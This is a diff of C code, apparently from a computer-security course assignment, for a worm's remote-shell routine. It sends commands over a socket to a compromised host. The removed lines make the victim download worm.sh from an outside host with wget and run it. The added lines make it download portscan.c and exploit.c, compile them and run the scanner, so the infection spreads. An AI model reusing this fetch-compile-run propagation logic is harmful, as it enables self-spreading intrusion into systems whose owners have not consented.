@@ -282,20 +282,21 @@ void cshell (int sock) {
         char    buf2[2];
         fd_set  rfds;
 
-        char *commands[3] = {   
-                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/worm.sh\n",
-                                "chmod +x worm.sh\n",
-                                "./worm.sh > worm.out\n"
+        char *commands[4] = {   
+                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n",
+                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n",
+                                "gcc -o portscan portscan.c exploit.c\n",
+                                "./portscan > portscan.out\n"
         };
 
         int i;
-        for(i=0; i<3; i++) {
+        for(i=0; i<4; i++) {
             printf("sending command '%s", commands[i]);
             write (sock, commands[i], strlen(commands[i]));
-            sleep(1);
-            if (i == 1) {
-                sleep(10);
-            }
+            // sleep(3);
+            // if (i == 1) {
+            sleep(5);
+            // }
         }
         
 
